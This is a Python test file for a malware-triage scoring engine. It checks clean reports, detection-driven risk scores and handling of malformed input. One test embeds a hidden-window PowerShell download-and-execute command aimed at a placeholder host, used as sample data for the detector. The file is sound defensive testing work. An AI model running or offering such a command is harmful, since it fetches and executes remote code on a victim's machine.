from titan_decoder.core.intelligence import IntelligenceEngine


def test_clean_report_stays_clean():
    result = IntelligenceEngine().analyze({"nodes": [], "iocs": {}})
    assert result["intelligence_score"] == 0
    assert result["classification"] == "CLEAN"
    assert result["signals"] == []


def test_suspicious_execution_and_url_are_explained():
    report = {
        "nodes": [
            {
                "id": 2,
                "depth": 4,
                "entropy": 5.0,
                "decode_score": 0.8,
                "content_preview": (
                    "powershell -nop -w hidden; "
                    "IEX(New-Object Net.WebClient).DownloadString"
                    "('https://example.test/a')"
                ),
            }
        ],
        "iocs": {"urls": ["https://example.test/a"]},
    }

    result = IntelligenceEngine().analyze(report)

    assert result["intelligence_score"] >= 36
    assert result["classification"] in {
        "SUSPICIOUS_OBJECT",
        "HIGH_RISK_PAYLOAD",
        "LIKELY_MALICIOUS",
    }
    codes = {signal["code"] for signal in result["signals"]}
    assert "execution_context" in codes
    assert "network_urls" in codes
    assert result["top_artifacts"][0]["node_id"] == 2


def test_detection_and_risk_alignment_raise_priority():
    report = {
        "nodes": [{"id": 0, "depth": 0, "entropy": 7.8, "content_preview": "MZ"}],
        "iocs": {},
        "detections": [{"name": "Test detection", "severity": "high"}],
        "risk_assessment": {"risk_level": "HIGH", "risk_score": 55},
    }

    result = IntelligenceEngine().analyze(report)

    assert result["intelligence_score"] >= 61
    assert result["classification"] in {"HIGH_RISK_PAYLOAD", "LIKELY_MALICIOUS"}
    assert result["recommendation"]


def test_missing_and_malformed_values_do_not_crash():
    report = {
        "nodes": [
            {
                "id": "not-an-int",
                "depth": None,
                "entropy": "unknown",
                "decode_score": None,
                "content_preview": None,
            }
        ],
        "iocs": {"urls": None},
    }

    result = IntelligenceEngine().analyze(report)
    assert result["classification"] == "CLEAN"
